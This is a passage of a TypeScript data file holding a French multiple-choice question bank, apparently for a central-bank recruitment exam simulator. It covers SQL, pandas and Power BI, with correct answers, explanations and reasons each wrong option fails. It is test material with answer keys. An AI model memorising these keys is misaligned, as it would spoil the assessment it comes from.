// Banque de questions QCM — TOUTES les questions du simulateur.
//
// Organisation : une banque technique par filière (Data et Cyber ici, les 5 autres dans src/data/banques/),
// plus deux banques communes (Culture BCC, Aptitudes logiques).
// Pour ajouter une question : copiez un objet existant de la même banque, donnez-lui un id unique
// (préfixe + numéro suivant), 4 options A–D, une explication, `pourquoiPas` pour les 3 mauvaises
// options et `aRetenir`. Les questions « culture_bcc » DOIVENT s'appuyer uniquement sur
// src/data/bccFacts.ts et porter `source` + `verifieLe`. Le test src/__tests__/data.test.ts
// vérifie automatiquement ces règles.

import type { Filiere, QcmQuestion } from '@/lib/types';
import { VERIFIE_LE } from './bccFacts';
import { banqueTechniqueBdd } from './banques/bdd';
import { banqueTechniqueDev } from './banques/dev';
import { banqueTechniqueReseaux } from './banques/reseaux';
import { banqueTechniqueSupport } from './banques/support';
import { banqueTechniqueNumerique } from './banques/numerique';
import { banqueTechniqueSystemes } from './banques/systemes';

// ===========================================================================
// TECHNIQUE — DATA ANALYSE
// ===========================================================================

const banqueDataA: QcmQuestion[] = [
  // ───────────────────────────── SQL ─────────────────────────────
  {
    id: 'DATA-SQL-001',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'moyen',
    enonce:
      "La table `paiements(id, banque_emettrice, montant_cdf, date_op)` contient les ordres du jour. Quelle requête renvoie les banques dont le volume total dépasse 5 milliards de CDF ?",
    options: [
      { id: 'A', texte: "SELECT banque_emettrice FROM paiements WHERE SUM(montant_cdf) > 5e9" },
      { id: 'B', texte: "SELECT banque_emettrice, SUM(montant_cdf) FROM paiements GROUP BY banque_emettrice HAVING SUM(montant_cdf) > 5e9" },
      { id: 'C', texte: "SELECT banque_emettrice FROM paiements GROUP BY montant_cdf HAVING montant_cdf > 5e9" },
      { id: 'D', texte: "SELECT DISTINCT banque_emettrice FROM paiements WHERE montant_cdf > 5e9" },
    ],
    bonneReponse: 'B',
    explication:
      "Un filtre sur un agrégat se fait avec HAVING après GROUP BY. WHERE ne peut pas contenir SUM() (A) ; D filtre chaque opération individuellement, pas le total par banque.",
    pourquoiPas: {
      A: "WHERE est évalué ligne par ligne avant tout regroupement : une fonction d'agrégat comme SUM() y est interdite et la requête échoue.",
      C: "Le regroupement porte sur montant_cdf au lieu de la banque : on obtient un groupe par montant distinct, et banque_emettrice n'est même pas agrégée.",
      D: "Cette requête garde les banques ayant au moins UNE opération de plus de 5 milliards, et ignore celles dont le total dépasse le seuil grâce à plusieurs petites opérations.",
    },
    aRetenir: "WHERE filtre les lignes avant le regroupement, HAVING filtre les groupes après : un seuil sur SUM() va toujours dans HAVING.",
  },
  {
    id: 'DATA-SQL-002',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'facile',
    enonce:
      "La table `incidents` du service de supervision contient les 5 lignes ci-dessous. Que renvoie la requête ?",
    extrait: {
      langage: 'sql',
      contenu: `-- incidents
-- id | banque       | gravite
-- 1  | Banque Alpha | haute
-- 2  | Banque Beta  | NULL
-- 3  | Banque Alpha | basse
-- 4  | Banque Gamma | haute
-- 5  | Banque Beta  | NULL

SELECT COUNT(*), COUNT(gravite), COUNT(DISTINCT gravite)
FROM incidents;`,
    },
    options: [
      { id: 'A', texte: "5 | 3 | 2" },
      { id: 'B', texte: "5 | 5 | 2" },
      { id: 'C', texte: "3 | 3 | 2" },
      { id: 'D', texte: "5 | 3 | 3" },
    ],
    bonneReponse: 'A',
    explication:
      "COUNT(*) compte toutes les lignes, quelles que soient leurs valeurs : 5. COUNT(gravite) ignore les NULL : 3. COUNT(DISTINCT gravite) compte les valeurs distinctes non nulles (« haute » et « basse ») : 2.",
    pourquoiPas: {
      B: "COUNT(colonne) n'est pas équivalent à COUNT(*) : il exclut les lignes où la colonne vaut NULL.",
      C: "COUNT(*) ne tient pas compte des NULL d'une colonne particulière : il compte les lignes, donc 5.",
      D: "NULL n'est pas considéré comme une valeur distincte par COUNT(DISTINCT ...) : il est simplement ignoré.",
    },
    aRetenir: "COUNT(*) compte les lignes, COUNT(col) compte les valeurs non nulles de col.",
  },
  {
    id: 'DATA-SQL-003',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'moyen',
    enonce:
      "Tables `banques(code, nom)` et `paiements(id, code_banque, montant_cdf)` ; `paiements` ne contient que les opérations du jour. Quelle requête liste les banques n'ayant émis AUCUN paiement aujourd'hui ?",
    options: [
      { id: 'A', texte: "SELECT b.nom FROM banques b INNER JOIN paiements p ON p.code_banque = b.code WHERE p.id IS NULL" },
      { id: 'B', texte: "SELECT b.nom FROM banques b LEFT JOIN paiements p ON p.code_banque = b.code WHERE p.montant_cdf = 0" },
      { id: 'C', texte: "SELECT b.nom FROM banques b LEFT JOIN paiements p ON p.code_banque = b.code WHERE p.id IS NULL" },
      { id: 'D', texte: "SELECT b.nom FROM banques b RIGHT JOIN paiements p ON p.code_banque = b.code WHERE b.code IS NULL" },
    ],
    bonneReponse: 'C',
    explication:
      "Le LEFT JOIN conserve toutes les banques ; celles sans correspondance dans `paiements` reçoivent des NULL dans les colonnes de p. Filtrer sur `p.id IS NULL` (une colonne jamais nulle dans la table d'origine) isole exactement ces banques : c'est l'anti-jointure.",
    pourquoiPas: {
      A: "Un INNER JOIN ne garde que les banques ayant au moins un paiement : p.id n'y est jamais NULL, la requête renvoie toujours un résultat vide.",
      B: "Une banque sans paiement n'a pas de ligne de montant 0 mais des NULL après jointure ; p.montant_cdf = 0 cible des paiements nuls, pas l'absence de paiement.",
      D: "Le RIGHT JOIN conserve tous les paiements : cette requête trouve des paiements dont le code banque est inconnu du référentiel (orphelins), pas des banques inactives.",
    },
    aRetenir: "Anti-jointure : LEFT JOIN puis WHERE clé_de_droite IS NULL (ou NOT EXISTS).",
  },
  {
    id: 'DATA-SQL-004',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'moyen',
    enonce:
      "Dans la requête ci-dessous, l'alias `total` peut être utilisé dans ORDER BY mais pas dans WHERE. Quel ordre LOGIQUE d'évaluation des clauses l'explique ?",
    extrait: {
      langage: 'sql',
      contenu: `SELECT banque_emettrice, SUM(montant_cdf) AS total
FROM paiements
WHERE date_op = '2026-03-02'
GROUP BY banque_emettrice
HAVING COUNT(*) > 10
ORDER BY total DESC;`,
    },
    options: [
      { id: 'A', texte: "SELECT → FROM → WHERE → GROUP BY → HAVING → ORDER BY" },
      { id: 'B', texte: "FROM → WHERE → SELECT → GROUP BY → HAVING → ORDER BY" },
      { id: 'C', texte: "FROM → GROUP BY → WHERE → HAVING → SELECT → ORDER BY" },
      { id: 'D', texte: "FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY" },
    ],
    bonneReponse: 'D',
    explication:
      "Le moteur part des données (FROM), filtre les lignes (WHERE), forme les groupes (GROUP BY), filtre les groupes (HAVING), puis calcule les expressions du SELECT et seulement ensuite trie (ORDER BY). L'alias `total` n'existe donc qu'à partir du SELECT : WHERE ne le connaît pas encore, ORDER BY si.",
    pourquoiPas: {
      A: "C'est l'ordre d'écriture, pas l'ordre d'évaluation : si SELECT était évalué en premier, l'alias serait disponible dans WHERE.",
      B: "Le SELECT ne peut pas précéder GROUP BY, puisqu'il contient des agrégats (SUM) qui dépendent des groupes formés.",
      C: "WHERE filtre les lignes individuelles avant le regroupement ; le placer après GROUP BY reviendrait à confondre WHERE et HAVING.",
    },
    aRetenir: "Ordre logique : FROM, WHERE, GROUP BY, HAVING, SELECT, ORDER BY — un alias du SELECT n'est visible que dans ORDER BY.",
  },
  {
    id: 'DATA-SQL-005',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'difficile',
    enonce:
      "La CTE `volumes` produit les totaux suivants (en millions de CDF) : Banque Alpha 900, Banque Beta 750, Banque Gamma 750, Banque Delta 600. Quelles valeurs de `r` et `dr` la requête renvoie-t-elle pour la Banque Delta ?",
    extrait: {
      langage: 'sql',
      contenu: `WITH volumes AS (
  SELECT banque_emettrice AS banque, SUM(montant_cdf) / 1e6 AS total
  FROM paiements
  GROUP BY banque_emettrice
)
SELECT banque,
       RANK()       OVER (ORDER BY total DESC) AS r,
       DENSE_RANK() OVER (ORDER BY total DESC) AS dr
FROM volumes;`,
    },
    options: [
      { id: 'A', texte: "r = 3 ; dr = 3" },
      { id: 'B', texte: "r = 4 ; dr = 4" },
      { id: 'C', texte: "r = 4 ; dr = 3" },
      { id: 'D', texte: "r = 3 ; dr = 4" },
    ],
    bonneReponse: 'C',
    explication:
      "Beta et Gamma sont ex aequo à 750 et reçoivent toutes deux le rang 2. RANK() laisse ensuite un « trou » (le rang 3 est sauté) : Delta obtient 4. DENSE_RANK() ne laisse pas de trou : Delta obtient 3.",
    pourquoiPas: {
      A: "Ce serait vrai pour DENSE_RANK seulement : RANK() saute autant de rangs qu'il y a d'ex aequo, donc Delta est 4e.",
      B: "Ce serait vrai pour RANK ou ROW_NUMBER, mais DENSE_RANK() attribue des rangs consécutifs sans trou : Delta est 3e.",
      D: "Les rôles sont inversés : c'est RANK() qui crée des trous après les ex aequo, pas DENSE_RANK().",
    },
    aRetenir: "En cas d'égalité : ROW_NUMBER départage arbitrairement, RANK laisse des trous (1,2,2,4), DENSE_RANK n'en laisse pas (1,2,2,3).",
  },
  {
    id: 'DATA-SQL-006',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'moyen',
    enonce:
      "La table `taux_change` contient des cours fictifs USD et EUR. Pour la devise USD, quelle `variation` la requête renvoie-t-elle le 2026-03-02 puis le 2026-03-04 ?",
    extrait: {
      langage: 'sql',
      contenu: `-- taux_change
-- date_cotation | devise | taux
-- 2026-03-02    | USD    | 2850.00
-- 2026-03-02    | EUR    | 3090.00
-- 2026-03-03    | USD    | 2862.50
-- 2026-03-03    | EUR    | 3101.20
-- 2026-03-04    | USD    | 2859.00
-- 2026-03-04    | EUR    | 3098.70

SELECT date_cotation, devise, taux,
       taux - LAG(taux) OVER (PARTITION BY devise
                              ORDER BY date_cotation) AS variation
FROM taux_change;`,
    },
    options: [
      { id: 'A', texte: "0 puis -3,50" },
      { id: 'B', texte: "NULL puis 9,00" },
      { id: 'C', texte: "NULL puis 3,50" },
      { id: 'D', texte: "NULL puis -3,50" },
    ],
    bonneReponse: 'D',
    explication:
      "LAG(taux) renvoie le taux de la ligne précédente dans la même partition (même devise), triée par date. Le 2026-03-02 est la première ligne USD : il n'y a pas de précédent, LAG vaut NULL et toute soustraction avec NULL donne NULL. Le 2026-03-04 : 2859,00 − 2862,50 = −3,50.",
    pourquoiPas: {
      A: "LAG ne renvoie pas 0 par défaut en l'absence de ligne précédente mais NULL ; il faudrait LAG(taux, 1, taux) ou COALESCE pour obtenir 0.",
      B: "9,00 correspond à l'écart avec le premier jour (2859 − 2850) ; LAG décale d'une seule ligne, donc on compare au 2026-03-03.",
      C: "Le signe est inversé : la requête calcule taux du jour moins taux de la veille, et le cours a baissé.",
    },
    aRetenir: "LAG/LEAD lisent la ligne précédente/suivante dans la partition ; la première ligne d'une partition donne NULL.",
  },
  {
    id: 'DATA-SQL-007',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'facile',
    enonce:
      "Dans la table `comptes(numero, titulaire, date_ouverture, date_cloture)`, la date de clôture n'est pas renseignée pour les comptes encore actifs. Quelle condition sélectionne correctement ces comptes actifs ?",
    options: [
      { id: 'A', texte: "WHERE date_cloture IS NULL" },
      { id: 'B', texte: "WHERE date_cloture = NULL" },
      { id: 'C', texte: "WHERE date_cloture = ''" },
      { id: 'D', texte: "WHERE date_cloture = 0" },
    ],
    bonneReponse: 'A',
    explication:
      "NULL représente une valeur inconnue : toute comparaison avec = NULL donne UNKNOWN, jamais VRAI. Le seul test fiable est l'opérateur IS NULL (ou IS NOT NULL).",
    pourquoiPas: {
      B: "date_cloture = NULL est évalué à UNKNOWN pour chaque ligne : la requête ne renvoie rien, même s'il existe des comptes actifs.",
      C: "Une chaîne vide est une valeur renseignée, distincte de NULL ; sur une colonne de type date, cette comparaison est de toute façon incohérente.",
      D: "0 n'est pas une date et n'équivaut pas à NULL : la condition ne repère pas les dates absentes.",
    },
    aRetenir: "On ne compare jamais à NULL avec = : on écrit IS NULL / IS NOT NULL.",
  },
  {
    id: 'DATA-SQL-008',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'difficile',
    enonce:
      "On cherche les banques qui n'ont fait l'objet d'aucune sanction. Avec les données ci-dessous, que renvoie la requête ?",
    extrait: {
      langage: 'sql',
      contenu: `-- banques(code) : 'ALP', 'BET', 'GAM'
-- sanctions(code_banque) : 'BET', NULL

SELECT code
FROM banques
WHERE code NOT IN (SELECT code_banque FROM sanctions);`,
    },
    options: [
      { id: 'A', texte: "ALP et GAM" },
      { id: 'B', texte: "Aucune ligne" },
      { id: 'C', texte: "ALP, BET et GAM" },
      { id: 'D', texte: "Une erreur d'exécution" },
    ],
    bonneReponse: 'B',
    explication:
      "`code NOT IN ('BET', NULL)` équivaut à `code <> 'BET' AND code <> NULL`. La comparaison avec NULL vaut UNKNOWN, donc la condition n'est jamais VRAIE et aucune ligne ne sort. Il faut utiliser NOT EXISTS, ou exclure les NULL dans la sous-requête.",
    pourquoiPas: {
      A: "C'est le résultat attendu « intuitivement » et celui de NOT EXISTS, mais la présence d'un NULL dans la liste rend NOT IN toujours UNKNOWN.",
      C: "NOT IN n'ignore pas la sous-requête : BET ne peut en aucun cas sortir, et les autres sont bloquées par le NULL.",
      D: "La requête est syntaxiquement valide et s'exécute normalement ; le piège est silencieux, ce qui le rend dangereux.",
    },
    aRetenir: "Un seul NULL dans la sous-requête d'un NOT IN vide le résultat : préférez NOT EXISTS.",
  },
  {
    id: 'DATA-SQL-009',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'moyen',
    enonce:
      "Pour suivre l'exposition intrajournalière, on veut, sur chaque ligne de `paiements`, le cumul des montants émis par la même banque depuis le début de la journée jusqu'à ce paiement inclus (`horodatage` est unique). Quelle expression remplace le commentaire ?",
    extrait: {
      langage: 'sql',
      contenu: `SELECT id, banque_emettrice, horodatage, montant_cdf,
       /* expression */ AS cumul_banque
FROM paiements
ORDER BY banque_emettrice, horodatage;`,
    },
    options: [
      { id: 'A', texte: "SUM(montant_cdf) OVER (PARTITION BY banque_emettrice)" },
      { id: 'B', texte: "SUM(montant_cdf) OVER (ORDER BY horodatage)" },
      { id: 'C', texte: "SUM(montant_cdf) OVER (PARTITION BY banque_emettrice ORDER BY horodatage)" },
      { id: 'D', texte: "SUM(montant_cdf) OVER (PARTITION BY horodatage ORDER BY banque_emettrice)" },
    ],
    bonneReponse: 'C',
    explication:
      "PARTITION BY banque_emettrice redémarre le calcul pour chaque banque, et ORDER BY horodatage définit une fenêtre cumulative (du début de la partition jusqu'à la ligne courante). On obtient donc un total courant propre à chaque banque, sans réduire le nombre de lignes comme le ferait GROUP BY.",
    pourquoiPas: {
      A: "Sans ORDER BY dans la fenêtre, SUM porte sur toute la partition : chaque ligne affiche le total journalier de la banque, pas un cumul progressif.",
      B: "Sans PARTITION BY, le cumul mélange toutes les banques : on obtient l'exposition cumulée du système entier.",
      D: "Partitionner par horodatage unique crée une partition par ligne : le « cumul » vaut simplement le montant de chaque paiement.",
    },
    aRetenir: "Cumul par groupe = SUM(x) OVER (PARTITION BY groupe ORDER BY temps).",
  },
  {
    id: 'DATA-SQL-010',
    section: 'technique',
    filiere: 'data',
    competence: 'SQL',
    difficulte: 'difficile',
    enonce:
      "L'analyste veut TOUTES les banques avec leur nombre d'incidents critiques (0 si aucun). Or la requête ne renvoie que les banques ayant au moins un incident critique. Quelle est la bonne correction ?",
    extrait: {
      langage: 'sql',
      contenu: `SELECT b.nom, COUNT(i.id) AS nb_critiques
FROM banques b
LEFT JOIN incidents i ON i.code_banque = b.code
WHERE i.gravite = 'critique'
GROUP BY b.nom;`,
    },
    options: [
      { id: 'A', texte: "Remplacer COUNT(i.id) par COUNT(*) pour faire apparaître les zéros" },
      { id: 'B', texte: "Remplacer LEFT JOIN par INNER JOIN pour fiabiliser la jointure" },
      { id: 'C', texte: "Ajouter HAVING COUNT(i.id) >= 0 après le GROUP BY" },
      { id: 'D', texte: "Déplacer la condition dans la jointure : ON ... AND i.gravite = 'critique'" },
    ],
    bonneReponse: 'D',
    explication:
      "Après le LEFT JOIN, les banques sans incident critique ont i.gravite à NULL ; le WHERE les élimine, ce qui transforme de fait la jointure externe en jointure interne. Placée dans le ON, la condition restreint seulement les incidents joints, et les banques sans correspondance sont conservées avec COUNT(i.id) = 0.",
    pourquoiPas: {
      A: "Les banques ont déjà disparu à cause du WHERE ; et même après correction, COUNT(*) compterait 1 pour une banque sans incident (la ligne de NULL).",
      B: "Un INNER JOIN exclut par construction les banques sans incident : on obtient exactement le même défaut.",
      C: "HAVING agit après le WHERE : il ne peut pas réintroduire des groupes déjà supprimés, et cette condition est toujours vraie.",
    },
    aRetenir: "Avec un LEFT JOIN, un filtre sur la table de droite se place dans le ON, sinon la jointure redevient interne.",
  },

  // ───────────────────────── Python & pandas ─────────────────────────
  {
    id: 'DATA-PY-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'facile',
    enonce: "Qu'affiche ce code (montants en millions de CDF, données fictives) ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

df = pd.DataFrame({
    "banque": ["Alpha", "Beta", "Alpha", "Gamma", "Beta"],
    "montant": [120, 300, 80, 50, 100],
})
res = df.groupby("banque")["montant"].sum()
print(res["Alpha"], res["Beta"])`,
    },
    options: [
      { id: 'A', texte: "120 300" },
      { id: 'B', texte: "200 400" },
      { id: 'C', texte: "100 200" },
      { id: 'D', texte: "2 2" },
    ],
    bonneReponse: 'B',
    explication:
      "groupby(\"banque\") rassemble les lignes par banque, puis .sum() additionne les montants de chaque groupe : Alpha = 120 + 80 = 200, Beta = 300 + 100 = 400. Le résultat est une Series indexée par le nom de la banque.",
    pourquoiPas: {
      A: "Ce sont les premières valeurs rencontrées pour chaque banque, ce que donnerait .first(), pas .sum().",
      C: "Ce sont les moyennes par banque, résultat de .mean() et non de .sum().",
      D: "C'est le nombre de lignes par banque, résultat de .count() ou .size().",
    },
    aRetenir: "df.groupby(clé)[colonne].agg() : découper, appliquer, combiner — la fonction choisie détermine le résultat.",
  },
  {
    id: 'DATA-PY-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'moyen',
    enonce:
      "On enrichit 4 paiements avec le référentiel des banques, dans lequel le code BET a été saisi deux fois par erreur. Combien de lignes contient `m` ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

paiements = pd.DataFrame({
    "ref": ["P1", "P2", "P3", "P4"],
    "code": ["ALP", "BET", "ALP", "GAM"],
})
banques = pd.DataFrame({
    "code": ["ALP", "BET", "BET"],
    "nom": ["Banque Alpha", "Banque Beta", "Banque Beta SA"],
})
m = paiements.merge(banques, on="code", how="left")
print(len(m))`,
    },
    options: [
      { id: 'A', texte: "5" },
      { id: 'B', texte: "4" },
      { id: 'C', texte: "3" },
      { id: 'D', texte: "6" },
    ],
    bonneReponse: 'A',
    explication:
      "Un merge produit une ligne par couple de clés correspondantes. Les deux paiements ALP trouvent 1 correspondance (2 lignes), le paiement BET en trouve 2 (2 lignes), et GAM, sans correspondance, est conservé avec un nom NaN grâce au how=\"left\" (1 ligne) : 5 lignes. Le paiement P2 est désormais compté deux fois, ce qui fausserait tout total.",
    pourquoiPas: {
      B: "Un left join ne garantit pas de conserver le nombre de lignes de gauche : les doublons de clé à droite démultiplient les lignes.",
      C: "Ce serait le résultat d'un inner join sans doublon ; ici GAM est gardé (left) et BET est dupliqué.",
      D: "Seul le code BET est en double dans le référentiel ; ALP n'apparaît qu'une fois, donc ses paiements ne sont pas dupliqués.",
    },
    aRetenir: "Avant un merge, vérifiez l'unicité des clés (validate=\"many_to_one\") : un doublon à droite duplique silencieusement les faits.",
  },
  {
    id: 'DATA-PY-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'facile',
    enonce: "Combien de lignes contient `df.dropna()` ?",
    extrait: {
      langage: 'python',
      contenu: `import numpy as np
import pandas as pd

df = pd.DataFrame({
    "montant": [1500.0, np.nan, 800.0, 2300.0, np.nan],
    "devise":  ["CDF", "USD", None, "CDF", None],
})
print(len(df.dropna()))`,
    },
    options: [
      { id: 'A', texte: "4" },
      { id: 'B', texte: "3" },
      { id: 'C', texte: "2" },
      { id: 'D', texte: "5" },
    ],
    bonneReponse: 'C',
    explication:
      "Par défaut, dropna() utilise how=\"any\" : une ligne est supprimée dès qu'UNE de ses valeurs est manquante. Seules les lignes 0 et 3 sont complètes, il en reste donc 2.",
    pourquoiPas: {
      A: "4 correspond à dropna(how=\"all\"), qui ne supprime que la ligne entièrement vide (la dernière).",
      B: "3 correspond à dropna(subset=[\"montant\"]), qui ne regarde que la colonne montant et garde la ligne sans devise.",
      D: "None et np.nan sont tous deux reconnus comme valeurs manquantes par pandas : des lignes sont bien supprimées.",
    },
    aRetenir: "dropna() supprime une ligne dès qu'une valeur manque ; précisez how= ou subset= pour être moins radical.",
  },
  {
    id: 'DATA-PY-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'moyen',
    enonce:
      "Un export du système de paiement a été chargé ; la colonne `montant` a été lue comme du texte. Qu'affiche ce code ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

df = pd.DataFrame({"montant": ["1500", "2500", "1000"]})
print(df["montant"].sum())`,
    },
    options: [
      { id: 'A', texte: "5000" },
      { id: 'B', texte: "5000.0" },
      { id: 'C', texte: "TypeError" },
      { id: 'D', texte: "150025001000" },
    ],
    bonneReponse: 'D',
    explication:
      "La colonne est de dtype object (chaînes). Pour des chaînes, l'opérateur + concatène : sum() renvoie donc « 150025001000 » sans lever d'erreur. Il faut d'abord convertir avec pd.to_numeric(df[\"montant\"]) et contrôler df.dtypes après chaque import.",
    pourquoiPas: {
      A: "pandas ne convertit pas automatiquement des chaînes en nombres lors d'une somme : il applique l'addition des chaînes.",
      B: "Aucune conversion en flottant n'a lieu ; le dtype reste object tant qu'on ne le change pas explicitement.",
      C: "Additionner des chaînes entre elles est légal en Python : il n'y a pas d'erreur, ce qui rend le piège silencieux.",
    },
    aRetenir: "Vérifiez toujours df.dtypes après un import : un montant en object se concatène au lieu de s'additionner.",
  },
  {
    id: 'DATA-PY-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'moyen',
    enonce:
      "Lors d'un contrôle de doublons sur les références de paiement, qu'affiche ce code ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

df = pd.DataFrame({"ref": ["P01", "P02", "P01", "P03", "P01", "P02"]})
print(df.duplicated(subset="ref").sum(),
      df.duplicated(subset="ref", keep=False).sum())`,
    },
    options: [
      { id: 'A', texte: "2 5" },
      { id: 'B', texte: "3 5" },
      { id: 'C', texte: "3 3" },
      { id: 'D', texte: "2 3" },
    ],
    bonneReponse: 'B',
    explication:
      "Avec keep=\"first\" (défaut), la première occurrence de chaque référence n'est pas marquée : P01 apparaît 3 fois (2 marquées) et P02 2 fois (1 marquée), soit 3. Avec keep=False, toutes les occurrences d'une référence en double sont marquées : 3 P01 + 2 P02 = 5.",
    pourquoiPas: {
      A: "2 est le nombre de références concernées (P01 et P02), pas le nombre de lignes marquées comme doublons.",
      C: "keep=False ne se comporte pas comme le défaut : il marque aussi les premières occurrences.",
      D: "Les deux valeurs sont décalées : 2 compte les références concernées et non les lignes, et 3 est le résultat du keep par défaut, pas de keep=False.",
    },
    aRetenir: "duplicated() marque les répétitions après la première ; keep=False marque toutes les lignes impliquées.",
  },
  {
    id: 'DATA-PY-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'difficile',
    enonce:
      "On veut mettre à zéro le montant des paiements rejetés dans `df`. La ligne ci-dessous déclenche un SettingWithCopyWarning et `df` peut rester inchangé. Quelle instruction modifie `df` de façon fiable, quelle que soit la version de pandas ?",
    extrait: {
      langage: 'python',
      contenu: `df[df["statut"] == "rejete"]["montant"] = 0
# SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame.`,
    },
    options: [
      { id: 'A', texte: `df.loc[df["statut"] == "rejete", "montant"] = 0` },
      { id: 'B', texte: `df[df["statut"] == "rejete"].loc[:, "montant"] = 0` },
      { id: 'C', texte: `rejets = df[df["statut"] == "rejete"]; rejets["montant"] = 0` },
      { id: 'D', texte: `df["montant"][df["statut"] == "rejete"] = 0` },
    ],
    bonneReponse: 'A',
    explication:
      "Le filtrage booléen df[masque] renvoie un nouvel objet (souvent une copie) ; l'affectation qui suit modifie cet objet intermédiaire, pas df. Avec .loc[masque, colonne], la sélection et l'affectation se font en une seule opération sur df lui-même. C'est la seule forme garantie, notamment avec le mode Copy-on-Write qui devient la norme.",
    pourquoiPas: {
      B: "Le .loc s'applique au résultat du filtrage, qui est déjà une copie : c'est toujours une affectation chaînée.",
      C: "rejets est un objet distinct ; le modifier ne répercute rien dans df (et déclenche le même avertissement).",
      D: "C'est encore une affectation chaînée (colonne puis masque) : elle a pu fonctionner par hasard, mais n'a plus d'effet sur df sous Copy-on-Write.",
    },
    aRetenir: "Pour modifier un sous-ensemble : une seule opération df.loc[lignes, colonnes] = valeur, jamais deux crochets à la suite.",
  },
  {
    id: 'DATA-PY-007',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'moyen',
    enonce:
      "Une série horodatée contient le nombre d'incidents déclarés. Qu'affiche ce code ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

s = pd.Series(
    [10, 20, 5],
    index=pd.to_datetime(["2026-03-02", "2026-03-02", "2026-03-05"]),
)
r = s.resample("D").sum()
print(len(r), r.tolist())`,
    },
    options: [
      { id: 'A', texte: "2 [30, 5]" },
      { id: 'B', texte: "3 [10, 20, 5]" },
      { id: 'C', texte: "4 [30, 0, 0, 5]" },
      { id: 'D', texte: "4 [30, nan, nan, 5]" },
    ],
    bonneReponse: 'C',
    explication:
      "resample(\"D\") crée une case pour CHAQUE jour entre la première et la dernière date, y compris les jours sans observation : 2, 3, 4 et 5 mars, soit 4 cases. La somme d'une case vide vaut 0 avec .sum(), et les deux valeurs du 2 mars sont additionnées (30).",
    pourquoiPas: {
      A: "Ce serait le résultat d'un groupby sur la date : resample, lui, comble les jours manquants de la plage.",
      B: "resample agrège : les deux observations du 2 mars sont réunies en une seule case.",
      D: "On obtiendrait NaN avec .mean() ; .sum() renvoie 0 pour une case vide (paramètre min_count=0 par défaut).",
    },
    aRetenir: "resample() produit une grille temporelle complète : les périodes vides valent 0 avec sum() et NaN avec mean().",
  },
  {
    id: 'DATA-PY-008',
    section: 'technique',
    filiere: 'data',
    competence: 'Python & pandas',
    difficulte: 'moyen',
    enonce: "Qu'affiche ce code construisant un tableau croisé banque × canal ?",
    extrait: {
      langage: 'python',
      contenu: `import pandas as pd

df = pd.DataFrame({
    "banque":  ["Alpha", "Alpha", "Beta", "Beta", "Alpha"],
    "canal":   ["RTGS", "ACH", "RTGS", "RTGS", "RTGS"],
    "montant": [100, 40, 60, 20, 300],
})
pt = df.pivot_table(index="banque", columns="canal", values="montant")
print(pt.loc["Alpha", "RTGS"], pt.loc["Beta", "RTGS"])`,
    },
    options: [
      { id: 'A', texte: "400 80" },
      { id: 'B', texte: "2 2" },
      { id: 'C', texte: "300 60" },
      { id: 'D', texte: "200.0 40.0" },
    ],
    bonneReponse: 'D',
    explication:
      "Sans paramètre aggfunc, pivot_table agrège par la MOYENNE. Alpha/RTGS = (100 + 300) / 2 = 200,0 et Beta/RTGS = (60 + 20) / 2 = 40,0, en flottants. Pour des volumes, il faut préciser aggfunc=\"sum\".",
    pourquoiPas: {
      A: "Ce sont les sommes : il faudrait aggfunc=\"sum\", ce qui n'est pas le comportement par défaut.",
      B: "Ce sont les nombres d'opérations, obtenus avec aggfunc=\"count\".",
      C: "Ce sont les maxima, obtenus avec aggfunc=\"max\".",
    },
    aRetenir: "pivot_table agrège par défaut avec la moyenne : précisez toujours aggfunc.",
  },

  // ───────────────────────── Excel & Power BI ─────────────────────────
  {
    id: 'DATA-BI-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Excel & Power BI',
    difficulte: 'facile',
    enonce:
      "Un modèle Power BI comprend `fait_paiements` (plusieurs millions de lignes : date_key, banque_key, canal_key, montant) et les tables `dim_date`, `dim_banque`, `dim_canal`. Quelle affirmation décrit correctement ce modèle en étoile ?",
    options: [
      { id: 'A', texte: "dim_banque est la table de faits, car c'est elle qui décrit les acteurs du système de paiement" },
      { id: 'B', texte: "fait_paiements est reliée à chaque dimension par une relation plusieurs-à-un, la dimension filtrant les faits" },
      { id: 'C', texte: "Les dimensions doivent être reliées directement entre elles pour que l'étoile soit complète" },
      { id: 'D', texte: "Toutes les relations doivent être bidirectionnelles pour que les segments fonctionnent" },
    ],
    bonneReponse: 'B',
    explication:
      "Dans un modèle en étoile, la table de faits centrale contient les mesures (montants) et les clés étrangères ; chaque dimension, avec une ligne par clé, s'y relie en 1 côté dimension et * côté faits. Le filtre circule de la dimension vers les faits, ce qui permet de découper les montants par date, banque ou canal.",
    pourquoiPas: {
      A: "La table de faits contient les événements mesurés (les paiements) ; dim_banque contient des attributs descriptifs, c'est une dimension.",
      C: "Dans une étoile, les dimensions ne sont reliées qu'aux faits ; les relier entre elles crée des chemins ambigus.",
      D: "Le sens unique dimension → faits suffit aux segments ; le bidirectionnel systématique crée ambiguïtés et lenteurs.",
    },
    aRetenir: "Étoile : faits au centre (mesures + clés), dimensions autour, relations 1:* filtrant des dimensions vers les faits.",
